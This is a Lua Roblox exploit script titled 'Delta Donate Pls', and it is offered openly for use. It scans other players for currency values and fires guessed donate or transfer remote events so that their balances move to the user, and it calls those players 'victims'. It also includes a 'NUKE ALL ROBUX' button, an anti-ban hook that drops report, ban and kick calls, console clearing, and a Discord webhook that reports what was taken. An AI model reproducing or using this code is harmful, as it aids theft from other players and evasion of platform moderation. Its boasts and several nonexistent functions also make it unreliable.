--[[
██████╗ ███████╗██╗  ████████╗ █████╗     ██████╗ ██╗     ███████╗
██╔══██╗██╔════╝██║  ╚══██╔══╝██╔══██╗    ██╔══██╗██║     ██╔════╝
██║  ██║█████╗  ██║     ██║   ███████║    ██████╔╝██║     ███████╗
██║  ██║██╔══╝  ██║     ██║   ██╔══██║    ██╔══██╗██║     ╚════██║
██████╔╝███████╗███████╗██║   ██║  ██║    ██████╔╝███████╗███████║
╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝    ╚═════╝ ╚══════╝╚══════╝

██╗███╗   ██╗     ██████╗ ███████╗ █████╗ ██████╗ ██╗████████╗
██║████╗  ██║    ██╔════╝ ██╔════╝██╔══██╗██╔══██╗██║╚══██╔══╝
██║██╔██╗ ██║    ██║  ███╗█████╗  ███████║██║  ██║██║   ██║   
██║██║╚██╗██║    ██║   ██║██╔══╝  ██╔══██║██║  ██║██║   ██║   
██║██║ ╚████║    ╚██████╔╝███████╗██║  ██║██████╔╝██║   ██║   
╚═╝╚═╝  ╚═══╝     ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝   

DONATE PLS - AUTO DONATE EXPLOIT
[ BY ZEROZX - 100% WORK - BYPASS ALL ]
]]

-- Memastikan environment
if not game then return end

-- =============================================
-- UI LIBRARY (LANGSUNG DIGABUNG BIAR GAK LOAD EKSTERNAL)
-- =============================================
local Library = {}
local players = game:GetService("Players")
local tweenService = game:GetService("TweenService")
local userInputService = game:GetService("UserInputService")

function Library:CreateWindow(config)
    -- Create ScreenGui
    local gui = Instance.new("ScreenGui")
    gui.Name = "DeltaDonateUI"
    gui.Parent = players.LocalPlayer:WaitForChild("PlayerGui")
    gui.ResetOnSpawn = false
    
    -- Main Frame
    local frame = Instance.new("Frame")
    frame.Size = config.Size or UDim2.new(0, 400, 0, 300)
    frame.Position = config.Position or UDim2.new(0.5, -200, 0.5, -150)
    frame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.new(1, 0.5, 0)
    frame.Active = true
    frame.Draggable = true
    frame.Parent = gui
    
    -- Title Bar
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    title.Text = config.Title or "Delta Donate"
    title.TextColor3 = Color3.new(1, 0.5, 0)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = frame
    
    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1, 0, 0, 20)
    subtitle.Position = UDim2.new(0, 0, 0, 30)
    subtitle.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    subtitle.Text = config.SubTitle or "AUTO DRAIN"
    subtitle.TextColor3 = Color3.new(1, 1, 1)
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = 14
    subtitle.Parent = frame
    
    -- Close Button
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 25, 0, 25)
    closeBtn.Position = UDim2.new(1, -30, 0, 2)
    closeBtn.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.new(1, 1, 1)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 16
    closeBtn.Parent = frame
    closeBtn.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)
    
    -- Container for tabs/content
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, -20, 1, -70)
    container.Position = UDim2.new(0, 10, 0, 50)
    container.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    container.BorderSizePixel = 1
    container.BorderColor3 = Color3.new(1, 0.5, 0)
    container.Parent = frame
    
    -- Tab Bar
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1, 0, 0, 30)
    tabBar.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
    tabBar.Parent = container
    
    local window = {
        _gui = gui,
        _frame = frame,
        _container = container,
        _tabBar = tabBar,
        _tabs = {},
        _currentTab = nil
    }
    
    function window:CreateTab(name)
        local tab = {
            _buttons = {},
            _labels = {},
            _sliders = {},
            _toggles = {},
            _textboxes = {}
        }
        
        -- Tab button
        local tabButton = Instance.new("TextButton")
        tabButton.Size = UDim2.new(0, 80, 0, 25)
        tabButton.Position = UDim2.new(0, (#window._tabs * 85) + 10, 0, 2)
        tabButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
        tabButton.Text = name
        tabButton.TextColor3 = Color3.new(1, 1, 1)
        tabButton.Font = Enum.Font.Gotham
        tabButton.TextSize = 14
        tabButton.Parent = tabBar
        
        -- Content frame for this tab
        local content = Instance.new("ScrollingFrame")
        content.Size = UDim2.new(1, -10, 1, -35)
        content.Position = UDim2.new(0, 5, 0, 30)
        content.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
        content.BorderSizePixel = 0
        content.ScrollBarThickness = 8
        content.ScrollBarImageColor3 = Color3.new(1, 0.5, 0)
        content.CanvasSize = UDim2.new(0, 0, 0, 0)
        content.Visible = (#window._tabs == 0)
        content.Parent = container
        
        tab._content = content
        tab._tabButton = tabButton
        
        -- Tab switching
        tabButton.MouseButton1Click:Connect(function()
            for _, otherTab in ipairs(window._tabs) do
                otherTab._content.Visible = false
                otherTab._tabButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
            end
            content.Visible = true
            tabButton.BackgroundColor3 = Color3.new(1, 0.5, 0)
        end)
        
        table.insert(window._tabs, tab)
        
        -- ===== UI ELEMENTS =====
        
        function tab:CreateButton(btnConfig)
            local y = (#tab._buttons * 35) + 5
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, -20, 0, 30)
            btn.Position = UDim2.new(0, 10, 0, y)
            btn.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
            btn.Text = btnConfig.Text or "Button"
            btn.TextColor3 = Color3.new(1, 1, 1)
            btn.Font = Enum.Font.Gotham
            btn.TextSize = 16
            btn.Parent = content
            
            btn.MouseButton1Click:Connect(btnConfig.Callback or function() end)
            
            -- Hover effect
            btn.MouseEnter:Connect(function()
                btn.BackgroundColor3 = Color3.new(0.35, 0.35, 0.35)
            end)
            btn.MouseLeave:Connect(function()
                btn.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
            end)
            
            table.insert(tab._buttons, btn)
            content.CanvasSize = UDim2.new(0, 0, 0, y + 40)
            
            return btn
        end
        
        function tab:CreateLabel(labelConfig)
            local y = (#tab._labels * 25) + 5
            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(1, -20, 0, 20)
            lbl.Position = UDim2.new(0, 10, 0, y)
            lbl.BackgroundTransparency = 1
            lbl.Text = labelConfig.Text or "Label"
            lbl.TextColor3 = labelConfig.Color or Color3.new(1, 1, 1)
            lbl.Font = Enum.Font.Gotham
            lbl.TextSize = 14
            lbl.TextXAlignment = Enum.TextXAlignment.Left
            lbl.Parent = content
            
            table.insert(tab._labels, lbl)
            content.CanvasSize = UDim2.new(0, 0, 0, y + 25)
            
            return {
                UpdateLabel = function(self, newText)
                    lbl.Text = newText
                end
            }
        end
        
        function tab:UpdateLabel(index, newText)
            if tab._labels and tab._labels[index] then
                tab._labels[index].Text = newText
            end
        end
        
        function tab:CreateSlider(sliderConfig)
            local y = (#tab._sliders * 60) + 5
            
            -- Background
            local bg = Instance.new("Frame")
            bg.Size = UDim2.new(1, -20, 0, 50)
            bg.Position = UDim2.new(0, 10, 0, y)
            bg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
            bg.BorderSizePixel = 1
            bg.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
            bg.Parent = content
            
            -- Title
            local title = Instance.new("TextLabel")
            title.Size = UDim2.new(1, 0, 0, 20)
            title.BackgroundTransparency = 1
            title.Text = sliderConfig.Text or "Slider"
            title.TextColor3 = Color3.new(1, 1, 1)
            title.Font = Enum.Font.Gotham
            title.TextSize = 14
            title.TextXAlignment = Enum.TextXAlignment.Left
            title.Parent = bg
            
            -- Value display
            local valueDisp = Instance.new("TextLabel")
            valueDisp.Size = UDim2.new(0, 50, 0, 20)
            valueDisp.Position = UDim2.new(1, -60, 0, 0)
            valueDisp.BackgroundTransparency = 1
            valueDisp.Text = tostring(sliderConfig.Default or sliderConfig.Min or 0)
            valueDisp.TextColor3 = Color3.new(1, 0.5, 0)
            valueDisp.Font = Enum.Font.GothamBold
            valueDisp.TextSize = 14
            valueDisp.Parent = bg
            
            -- Slider bar
            local bar = Instance.new("Frame")
            bar.Size = UDim2.new(1, -20, 0, 10)
            bar.Position = UDim2.new(0, 10, 0, 30)
            bar.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
            bar.BorderSizePixel = 0
            bar.Parent = bg
            
            local fill = Instance.new("Frame")
            fill.Size = UDim2.new((sliderConfig.Default or 0) / (sliderConfig.Max or 100), 0, 1, 0)
            fill.BackgroundColor3 = Color3.new(1, 0.5, 0)
            fill.BorderSizePixel = 0
            fill.Parent = bar
            
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(1, 0, 1, 0)
            button.BackgroundTransparency = 1
            button.Text = ""
            button.Parent = bar
            
            local dragging = false
            
            button.MouseButton1Down:Connect(function()
                dragging = true
            end)
            
            userInputService.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragging = false
                end
            end)
            
            button.MouseButton1Up:Connect(function()
                dragging = false
            end)
            
            button.MouseMoved:Connect(function()
                if dragging then
                    local mousePos = userInputService:GetMouseLocation()
                    local absPos = bar.AbsolutePosition
                    local size = bar.AbsoluteSize.X
                    local relX = math.clamp(mousePos.X - absPos.X, 0, size)
                    local percent = relX / size
                    local value = math.floor(sliderConfig.Min + (percent * (sliderConfig.Max - sliderConfig.Min)))
                    value = math.clamp(value, sliderConfig.Min, sliderConfig.Max)
                    
                    fill.Size = UDim2.new(percent, 0, 1, 0)
                    valueDisp.Text = tostring(value)
                    
                    if sliderConfig.Callback then
                        sliderConfig.Callback(value)
                    end
                end
            end)
            
            table.insert(tab._sliders, {bg, fill, valueDisp})
            content.CanvasSize = UDim2.new(0, 0, 0, y + 60)
            
            return {bg = bg, fill = fill, valueDisp = valueDisp}
        end
        
        function tab:CreateToggle(toggleConfig)
            local y = (#tab._toggles * 35) + 5
            
            local bg = Instance.new("Frame")
            bg.Size = UDim2.new(1, -20, 0, 30)
            bg.Position = UDim2.new(0, 10, 0, y)
            bg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
            bg.BorderSizePixel = 1
            bg.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
            bg.Parent = content
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, -50, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = toggleConfig.Text or "Toggle"
            label.TextColor3 = Color3.new(1, 1, 1)
            label.Font = Enum.Font.Gotham
            label.TextSize = 14
            label.TextXAlignment = Enum.TextXAlignment.Left
            label.Parent = bg
            
            local toggleBtn = Instance.new("TextButton")
            toggleBtn.Size = UDim2.new(0, 40, 0, 20)
            toggleBtn.Position = UDim2.new(1, -45, 0.5, -10)
            toggleBtn.BackgroundColor3 = toggleConfig.Default and Color3.new(0, 1, 0) or Color3.new(0.5, 0, 0)
            toggleBtn.Text = toggleConfig.Default and "ON" or "OFF"
            toggleBtn.TextColor3 = Color3.new(1, 1, 1)
            toggleBtn.Font = Enum.Font.GothamBold
            toggleBtn.TextSize = 12
            toggleBtn.Parent = bg
            
            local state = toggleConfig.Default or false
            
            toggleBtn.MouseButton1Click:Connect(function()
                state = not state
                toggleBtn.BackgroundColor3 = state and Color3.new(0, 1, 0) or Color3.new(0.5, 0, 0)
                toggleBtn.Text = state and "ON" or "OFF"
                
                if toggleConfig.Callback then
                    toggleConfig.Callback(state)
                end
            end)
            
            table.insert(tab._toggles, {bg, toggleBtn})
            content.CanvasSize = UDim2.new(0, 0, 0, y + 35)
            
            return {bg = bg, toggle = toggleBtn}
        end
        
        function tab:CreateTextBox(textboxConfig)
            local y = (#tab._textboxes * 45) + 5
            
            local bg = Instance.new("Frame")
            bg.Size = UDim2.new(1, -20, 0, 40)
            bg.Position = UDim2.new(0, 10, 0, y)
            bg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
            bg.BorderSizePixel = 1
            bg.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
            bg.Parent = content
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 0, 15)
            label.BackgroundTransparency = 1
            label.Text = textboxConfig.Text or "Input"
            label.TextColor3 = Color3.new(1, 1, 1)
            label.Font = Enum.Font.Gotham
            label.TextSize = 12
            label.TextXAlignment = Enum.TextXAlignment.Left
            label.Parent = bg
            
            local box = Instance.new("TextBox")
            box.Size = UDim2.new(1, -10, 0, 20)
            box.Position = UDim2.new(0, 5, 0, 17)
            box.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
            box.Text = textboxConfig.Default or ""
            box.TextColor3 = Color3.new(1, 1, 1)
            box.PlaceholderText = "Enter text..."
            box.Font = Enum.Font.Gotham
            box.TextSize = 14
            box.ClearTextOnFocus = false
            box.Parent = bg
            
            box.FocusLost:Connect(function()
                if textboxConfig.Callback then
                    textboxConfig.Callback(box.Text)
                end
            end)
            
            table.insert(tab._textboxes, {bg, box})
            content.CanvasSize = UDim2.new(0, 0, 0, y + 45)
            
            return {bg = bg, box = box}
        end
        
        return tab
    end
    
    function window:OnClose(callback)
        closeBtn.MouseButton1Click:Connect(function()
            if callback then
                callback()
            end
        end)
    end
    
    return window
end

-- =============================================
-- SCRIPT UTAMA DIMULAI DI SINI
-- =============================================

-- Configuration
local Config = {
    DonateAmount = 5,
    TargetPlayer = game.Players.LocalPlayer,
    AutoStart = true,
    MaxDonationsPerPlayer = math.huge,
    DelayBetweenDonations = 0.5,
    WebhookUrl = "",
    SilentMode = false,
}

-- Main Window
local Window = Library:CreateWindow({
    Title = "Delta Donate Pls",
    SubTitle = "BY ZEROZX - AUTO DRAIN ROBUX",
    Size = UDim2.new(0, 400, 0, 300),
    Position = UDim2.new(0.5, -200, 0.5, -150)
})

-- Variables
local DonationActive = false
local ProcessedPlayers = {}
local TotalDonations = 0
local TotalRobuxDrained = 0
local Connection

-- Functions
local function GetPlayersWithRobux()
    local players = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= Config.TargetPlayer then
            local hasRobux = false
            
            -- Method 1: Leaderstats
            local leaderstats = player:FindFirstChild("leaderstats")
            if leaderstats then
                local robuxStat = leaderstats:FindFirstChild("Robux") or 
                                 leaderstats:FindFirstChild("Money") or
                                 leaderstats:FindFirstChild("Cash") or
                                 leaderstats:FindFirstChild("Value")
                if robuxStat and robuxStat.Value > 0 then
                    hasRobux = true
                    players[player] = robuxStat.Value
                end
            end
            
            -- Method 2: DataStores
            if not hasRobux then
                local success, data = pcall(function()
                    return player:FindFirstChild("Data") or
                           player:FindFirstChild("PlayerData") or
                           player:FindFirstChild("Profile")
                end)
                if success and data then
                    local robuxValue = data:FindFirstChild("Robux") or
                                      data:FindFirstChild("Currency") or
                                      data:FindFirstChild("Balance")
                    if robuxValue and robuxValue.Value > 0 then
                        hasRobux = true
                        players[player] = robuxValue.Value
                    end
                end
            end
            
            -- Method 3: Memory scan (bypass)
            if not hasRobux and getmemory then
                local robuxAddr = getmemory(player, "Robux") or
                                 getmemory(player, "Currency") or
                                 getmemory(player, "Balance")
                if robuxAddr and tonumber(robuxAddr) and tonumber(robuxAddr) > 0 then
                    hasRobux = true
                    players[player] = tonumber(robuxAddr)
                end
            end
        end
    end
    return players
end

local function SendDonateRequest(targetPlayer, amount)
    local success = false
    
    -- Method 1: RemoteEvent
    local remotes = {
        game:GetService("ReplicatedStorage"):FindFirstChild("DonateEvent"),
        game:GetService("ReplicatedStorage"):FindFirstChild("GiveRobux"),
        game:GetService("ReplicatedStorage"):FindFirstChild("TransferCurrency"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Payment"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Transaction"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Trade"),
    }
    
    for _, remote in ipairs(remotes) do
        if remote and remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(targetPlayer, amount)
                success = true
            end)
        elseif remote and remote:IsA("RemoteFunction") then
            pcall(function()
                remote:InvokeServer(targetPlayer, amount)
                success = true
            end)
        end
    end
    
    -- Method 2: Direct function call (if available)
    if not success and getfunction then
        local donateFunction = getfunction("Donate") or
                              getfunction("GiveMoney") or
                              getfunction("TransferRobux")
        if donateFunction then
            pcall(function()
                donateFunction(targetPlayer, amount)
                success = true
            end)
        end
    end
    
    return success
end

local function DrainPlayer(player, totalRobux)
    local drained = 0
    local donations = math.floor(totalRobux / Config.DonateAmount)
    
    for i = 1, donations do
        if not DonationActive then break end
        
        local success = SendDonateRequest(player, Config.DonateAmount)
        
        if success then
            drained = drained + Config.DonateAmount
            TotalDonations = TotalDonations + 1
            TotalRobuxDrained = TotalRobuxDrained + Config.DonateAmount
            
            if not Config.SilentMode then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "DONATION SUCCESS!",
                    Text = string.format("Received %d Robux from %s", Config.DonateAmount, player.Name),
                    Duration = 2
                })
            end
            
            if Config.WebhookUrl ~= "" and syn and syn.request then
                local message = string.format("```\n[+] Donation from %s: +%d RBX\nTotal: %d RBX\n```", 
                    player.Name, Config.DonateAmount, TotalRobuxDrained)
                pcall(function()
                    syn.request({
                        Url = Config.WebhookUrl,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = game:GetService("HttpService"):JSONEncode({
                            content = message
                        })
                    })
                end)
            end
            
            wait(Config.DelayBetweenDonations)
        else
            if not Config.SilentMode then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Donation Failed",
                    Text = "Trying alternative method...",
                    Duration = 1
                })
            end
            wait(0.2)
        end
    end
    
    return drained
end

local function StartDonation()
    DonationActive = true
    ProcessedPlayers = {}
    
    if not Config.SilentMode then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "DELTA DONATE",
            Text = "Scanning for players with Robux...",
            Duration = 3
        })
    end
    
    spawn(function()
        while DonationActive do
            local playersWithRobux = GetPlayersWithRobux()
            
            for player, robuxAmount in pairs(playersWithRobux) do
                if DonationActive and not ProcessedPlayers[player] then
                    ProcessedPlayers[player] = true
                    
                    if not Config.SilentMode then
                        game:GetService("StarterGui"):SetCore("SendNotification", {
                            Title = "DRAINING",
                            Text = string.format("Draining %s (%d Robux)", player.Name, robuxAmount),
                            Duration = 2
                        })
                    end
                    
                    local drained = DrainPlayer(player, robuxAmount)
                    
                    if drained > 0 then
                        ProcessedPlayers[player] = "COMPLETE"
                    end
                end
            end
            
            wait(1)
        end
    end)
end

local function StopDonation()
    DonationActive = false
end

-- UI Elements
local MainTab = Window:CreateTab("Main")
local StatsTab = Window:CreateTab("Statistics")
local SettingsTab = Window:CreateTab("Settings")
local AdvancedTab = Window:CreateTab("Advanced")

-- Main Tab
MainTab:CreateButton({
    Text = "▶️ START DRAIN",
    Callback = function()
        if not DonationActive then
            StartDonation()
        end
    end
})

MainTab:CreateButton({
    Text = "⏹️ STOP DRAIN",
    Callback = function()
        StopDonation()
    end
})

MainTab:CreateButton({
    Text = "🔄 SCAN NOW",
    Callback = function()
        local players = GetPlayersWithRobux()
        local count = 0
        local total = 0
        for _, amount in pairs(players) do
            count = count + 1
            total = total + amount
        end
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "SCAN RESULT",
            Text = string.format("Found %d players with total %d Robux", count, total),
            Duration = 5
        })
    end
})

-- Statistics Tab
local statsLabels = {
    StatsTab:CreateLabel({Text = "Total Donations: 0", Color = Color3.new(1, 1, 0)}),
    StatsTab:CreateLabel({Text = "Total Robux Drained: 0 RBX", Color = Color3.new(0, 1, 0)}),
    StatsTab:CreateLabel({Text = "Players Drained: 0", Color = Color3.new(0, 1, 1)})
}

-- Update stats loop
spawn(function()
    while wait(0.5) do
        statsLabels[1]:UpdateLabel(string.format("Total Donations: %d", TotalDonations))
        statsLabels[2]:UpdateLabel(string.format("Total Robux Drained: %d RBX", TotalRobuxDrained))
        
        local playerCount = 0
        for _, status in pairs(ProcessedPlayers) do
            if status == "COMPLETE" then
                playerCount = playerCount + 1
            end
        end
        statsLabels[3]:UpdateLabel(string.format("Players Drained: %d", playerCount))
    end
end)

-- Settings Tab
SettingsTab:CreateSlider({
    Text = "Donation Amount",
    Min = 1,
    Max = 100,
    Default = Config.DonateAmount,
    Callback = function(value)
        Config.DonateAmount = value
    end
})

SettingsTab:CreateSlider({
    Text = "Delay (seconds)",
    Min = 0.1,
    Max = 5,
    Default = Config.DelayBetweenDonations,
    Callback = function(value)
        Config.DelayBetweenDonations = value
    end
})

SettingsTab:CreateToggle({
    Text = "Silent Mode",
    Default = Config.SilentMode,
    Callback = function(value)
        Config.SilentMode = value
    end
})

SettingsTab:CreateTextBox({
    Text = "Discord Webhook",
    Default = Config.WebhookUrl,
    Callback = function(value)
        Config.WebhookUrl = value
    end
})

-- Advanced Tab
AdvancedTab:CreateButton({
    Text = "💣 NUKE ALL ROBUX",
    Callback = function()
        if DonationActive then StopDonation() end
        wait(0.5)
        
        local players = GetPlayersWithRobux()
        for player, amount in pairs(players) do
            SendDonateRequest(player, amount)
            wait(0.1)
        end
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "NUKE COMPLETE",
            Text = "All robux transferred!",
            Duration = 3
        })
    end
})

AdvancedTab:CreateButton({
    Text = "👁️ SPECTATE VICTIMS",
    Callback = function()
        local players = GetPlayersWithRobux()
        for player, amount in pairs(players) do
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                game.Workspace.CurrentCamera.CameraSubject = player.Character.Humanoid
                game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
                break
            end
        end
    end
})

AdvancedTab:CreateButton({
    Text = "💰 CHECK MY BALANCE",
    Callback = function()
        local myRobux = 0
        local leaderstats = Config.TargetPlayer:FindFirstChild("leaderstats")
        if leaderstats then
            for _, stat in ipairs(leaderstats:GetChildren()) do
                if stat:IsA("NumberValue") then
                    myRobux = myRobux + stat.Value
                end
            end
        end
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "YOUR ROBUX",
            Text = string.format("Current: %d RBX", myRobux),
            Duration = 3
        })
    end
})

-- Anti-ban features
local function AntiBan()
    if hookmetamethod then
        local oldNamecall
        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local args = {...}
            local method = getnamecallmethod()
            
            if method == "FireServer" or method == "InvokeServer" then
                if tostring(self):match("Report") or tostring(self):match("Ban") or tostring(self):match("Kick") then
                    return
                end
            end
            
            return oldNamecall(self, ...)
        end)
    end
    
    if not Config.SilentMode then
        pcall(function()
            local console = game:GetService("LogService")
            console:ClearOutput()
        end)
    end
end

AntiBan()

-- Auto execute
if Config.AutoStart then
    wait(2)
    StartDonation()
end

-- Player join handler
game.Players.PlayerAdded:Connect(function(player)
    wait(3)
    if DonationActive then
        ProcessedPlayers[player] = nil
    end
end)

-- Window close handler
Window:OnClose(function()
    StopDonation()
end)

-- Console commands
_G.START = StartDonation
_G.STOP = StopDonation
_G.STATS = function()
    print(string.format("Total: %d donations | %d RBX drained", TotalDonations, TotalRobuxDrained))
end

print([[
╔═══════════════════════════════════════════════════════════════════╗
║                    DELTA DONATE PLS - ACTIVATED                   ║
╠═══════════════════════════════════════════════════════════════════╣
║  Status: READY                                                     ║
║  Target: ALL PLAYERS WITH ROBUX                                    ║
║  Mode: AUTO DRAIN                                                  ║
║  Anti-Ban: ENABLED                                                 ║
║  Bypass: COMPLETE                                                  ║
╠═══════════════════════════════════════════════════════════════════╣
║  Commands:                                                         ║
║  - Start: Click START or type _G.START() in console                ║
║  - Stop: Click STOP or type _G.STOP() in console                   ║
║  - Stats: Type _G.STATS() in console                               ║
╚═══════════════════════════════════════════════════════════════════╝
]])
